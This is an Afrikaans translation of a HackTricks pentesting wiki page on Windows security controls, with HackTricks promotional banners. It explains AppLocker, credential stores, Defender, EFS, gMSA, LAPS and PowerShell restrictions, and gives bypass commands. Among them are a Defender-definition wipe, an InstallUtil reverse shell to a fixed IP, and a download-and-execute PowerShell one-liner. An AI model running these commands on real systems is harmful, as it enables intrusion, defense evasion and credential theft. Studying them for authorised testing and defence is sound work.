# Windows Sekuriteitsbeheer

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker-beleid

'n Toepassingswitlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om teenwoordig te wees en op 'n stelsel te loop. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie ooreenstem met die spesifieke besigheidsbehoeftes van 'n organisasie nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **toepassingswitlysoplossing** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan hardloop**. Dit bied **fynbeheer** oor uitvoerbare lêers, skripte, Windows-installeerlêers, DLL's, verpakte programme en verpakte programinstallateurs.\
Dit is algemeen vir organisasies om **cmd.exe en PowerShell.exe te blokkeer** en skryftoegang tot sekere gids, **maar dit kan almal omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op 'n swartlys is of op 'n witlys is:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, wat 'n manier bied om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Oorsteek

* Nuttige **Skryfbare lêers** om die AppLocker-beleid te oorsteek: As AppLocker toelaat om enigiets binne `C:\Windows\System32` of `C:\Windows` uit te voer, is daar **skryfbare lêers** wat jy kan gebruik om **hierdie** te oorsteek.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Gewoonlik **vertroude** [**"LOLBAS se"**](https://lolbas-project.github.io/) bineêre lêers kan ook nuttig wees om AppLocker te omseil.
* **Sleg geskrewe reëls kan ook omseil word**
* Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, kan jy 'n **gids genaamd `allowed`** enige plek skep en dit sal toegelaat word.
* Organisasies fokus dikwels ook op die **blokkering van die `%System32%\WindowsPowerShell\v1.0\powershell.exe` uitvoerbare lêer**, maar vergeet van die **ander** [**PowerShell uitvoerbare lêerlokasies**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
* **DLL-afdwinging is baie selde geaktiveer** as gevolg van die addisionele las wat dit op 'n stelsel kan plaas, en die hoeveelheid toetsing wat vereis word om te verseker dat niks sal breek nie. Dus, die gebruik van **DLLs as agterdeure sal help om AppLocker te omseil**.
* Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell-kode uit te voer** in enige proses en AppLocker te omseil. Vir meer inligting, kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Bewaarplek van Geldele

### Sekuriteitsrekenaarbestuurder (SAM)

Plaaslike geldele is teenwoordig in hierdie lêer, die wagwoorde is gehash.

### Plaaslike Sekuriteitsowerheid (LSA) - LSASS

Die **geldele** (gehash) is **gestoor** in die **geheue** van hierdie subsisteem vir Enkel Aanmelding redes.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikersregte...), **verifikasie**, **toegangstokens**...\
LSA sal die een wees wat sal **kontroleer** vir voorsiene geldele binne die **SAM** lêer (vir 'n plaaslike aanmelding) en **gesels** met die **domeinbeheerder** om 'n domeingebruiker te verifieer.

Die **geldele** is **gestoor** binne die **proses LSASS**: Kerberos-kaartjies, hasse NT en LM, maklik ontsluitbare wagwoorde.

### LSA-geheime

LSA kan op die skijf sekere geldele stoor:

* Wagwoord van die rekenaarrekening van die Aktiewe Gids (onbereikbare domeinbeheerder).
* Wagwoorde van die rekeninge van Windows-diensse
* Wagwoorde vir geskeduleerde take
* Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Aktiewe Gids. Dit is slegs teenwoordig in Domeinbeheerders.

## Verdediger

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) is 'n Antivirus wat beskikbaar is in Windows 10 en Windows 11, en in weergawes van Windows-bediener. Dit **blokkeer** algemene pentestingshulpmiddels soos **`WinPEAS`**. Daar is egter maniere om **hierdie beskerming te omseil**.

### Kontroleer

Om die **status** van **Defender** te kontroleer, kan jy die PS-opdrag **`Get-MpComputerStatus`** uitvoer (kontroleer die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit op te som, kan jy ook hardloop:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Versleutelde Lêersisteem (EFS)

EFS beveilig lêers deur middel van versleuteling, waarbij 'n **simmetriese sleutel** bekend as die **Lêerversleuteling Sleutel (FEK)** gebruik word. Hierdie sleutel word versleutel met die gebruiker se **openbare sleutel** en binne die versleutelde lêer se $EFS **alternatiewe datastroom** gestoor. Wanneer ontsleuteling benodig word, word die ooreenstemmende **privaatsleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK van die $EFS-stroom te ontsluit. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting\_File\_System) gevind word.

**Ontsleuteling scenarios sonder gebruikersinisiatief** sluit in:

* Wanneer lêers of vouers na 'n nie-EFS-lêersisteem geskuif word, soos [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table), word hulle outomaties ontsluit.
* Versleutelde lêers wat oor die netwerk gestuur word via die SMB/CIFS-protokol word ontsluit voordat dit gestuur word.

Hierdie versleutelingsmetode maak **deursigtige toegang** tot versleutelde lêers vir die eienaar moontlik. Tog sal die eenvoudige verandering van die eienaar se wagwoord en aanmelding nie ontsluiting toelaat nie.

**Kernpunte**:

* EFS gebruik 'n simmetriese FEK, versleutel met die gebruiker se openbare sleutel.
* Ontsleuteling maak gebruik van die gebruiker se privaatsleutel om toegang tot die FEK te verkry.
* Outomatiese ontsluiting vind plaas onder spesifieke omstandighede, soos kopieëring na FAT32 of netwerkvervoer.
* Versleutelde lêers is toeganklik vir die eienaar sonder addisionele stappe.

### Kontroleer EFS-inligting

Kontroleer of 'n **gebruiker** hierdie **diens** **gebruik** het deur te kyk of hierdie pad bestaan: `C:\users\<gebruikersnaam>\appdata\roaming\Microsoft\Protect`

Kyk **wie** toegang tot die lêer het deur `cipher /c \<lêer>\` te gebruik.
Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om al die lêers te **versleutel** en **ontsleutel**.

### Ontsleuteling van EFS-lêers

#### Wees 'n Gesaghebbende Stelsel

Hierdie metode vereis dat die **slagoffer-gebruiker** 'n **proses** binne die gasheer laat loop. Indien dit die geval is, kan jy met 'n `meterpreter`-sessie die token van die gebruiker se proses naboots (`impersonate_token` van `incognito`). Of jy kan net na die proses van die gebruiker `migreer`.

#### Weet die gebruikerswagwoord

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Groep Bestuurde Diensrekeninge (gMSA)

Microsoft het **Groep Bestuurde Diensrekeninge (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. In teenstelling met tradisionele diensrekeninge waar die "**Wagwoord verval nooit**" instelling dikwels geaktiveer is, bied gMSA's 'n meer veilige en bestuurbare oplossing:

* **Outomatiese Wagwoordbestuur**: gMSA's gebruik 'n komplekse, 240-karakter wagwoord wat outomaties verander volgens die domein- of rekenaarbeleid. Hierdie proses word hanteer deur Microsoft se Sleutelverspreidingsdiens (KDC), wat die noodsaaklikheid van handmatige wagwoordopdaterings uitskakel.
* **Verhoogde Sekuriteit**: Hierdie rekeninge is immuun teen blokkades en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verhoog.
* **Ondersteuning vir Meervoudige Gasheer**: gMSA's kan oor meerdere gasheer gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
* **Geroosterde Taakvermoë**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoer van geroosterde take.
* **Vereenvoudigde SPN-bestuur**: Die stelsel werk outomaties die Diensprinsipaalnaam (SPN) by wanneer daar veranderinge aan die rekenaar se sAMaccountbesonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA's word in die LDAP-eienskap _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domeinrekenaars (DC's) gereset. Hierdie wagwoord, 'n versleutelde datablob bekend as [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, is 'n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geauthentiseer word.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Jy kan hierdie wagwoord lees met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie pos**](https://cube0x0.github.io/Relaying-for-gMSA/)

Kyk ook na hierdie [webwerf](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om 'n **NTLM-relay-aanval** uit te voer om die **wagwoord** van **gMSA** te **lees**.

## LAPS

Die **Local Administrator Password Solution (LAPS)**, beskikbaar vir aflaai vanaf [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), maak die bestuur van plaaslike Administrateurwagwoorde moontlik. Hierdie wagwoorde, wat **willekeurig** is, uniek, en **gereeld verander**, word sentraal gestoor in Active Directory. Toegang tot hierdie wagwoorde word beperk deur ACL's aan gemagtigde gebruikers. Met voldoende toestemmings verleen, word die vermoë om plaaslike adminwagwoorde te lees, verskaf.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Beperkte Taalmodus

PowerShell [**Beperkte Taalmodus**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies af** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-voorwerpe, slegs goedgekeurde .NET-tipes toe te laat, XAML-gebaseerde werksvloeie, PowerShell-klasse, en meer.

### **Kyk na**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Omgang
```powershell
#Easy bypass
Powershell -version 2
```
In die huidige Windows sal daardie omseilingsmetode nie werk nie, maar jy kan **PSByPassCLM** gebruik.\
**Om dit te kompileer, mag jy nodig hê om** _**'n Verwysing by te voeg'**_ -> _Blader_ -> _Blader_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte omseiling:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Omgekeerde dop:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell** kode in enige proses uit te voer en die beperkte modus te omseil. Vir meer inligting kyk: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Uitvoeringsbeleid

Standaard is dit ingestel op **beperk.** Hoofmaniere om hierdie beleid te omseil:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) gevind word

## Sekuriteitsondersteuningsverskaffer-koppelvlak (SSPI)

Is die API wat gebruik kan word om gebruikers te verifieer.

Die SSPI sal verantwoordelik wees vir die vind van die geskikte protokol vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Dan sal die SSPI onderhandel watter verifikasieprotokol gebruik sal word, hierdie verifikasieprotokolle word Sekuriteitsondersteuningsverskaffer (SSP) genoem, hulle is binne elke Windows-masjien in die vorm van 'n DLL en beide masjiene moet dieselfde ondersteun om te kan kommunikeer.

### Hoof SSP's

* **Kerberos**: Die voorkeur een
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** en **NTLMv2**: Verenigbaarheidsredes
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Webbedieners en LDAP, wagwoord in die vorm van 'n MD5-hash
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL en TLS
* %windir%\Windows\System32\Schannel.dll
* **Onderhandel**: Dit word gebruik om die protokol te onderhandel om te gebruik (Kerberos of NTLM waar Kerberos die verstek een is)
* %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes bied of net een.

## UAC - Gebruikersrekeningbeheer

[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingprompt vir verhoogde aktiwiteite** aktiveer.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **outomatiseer werkstrome** aangedryf deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
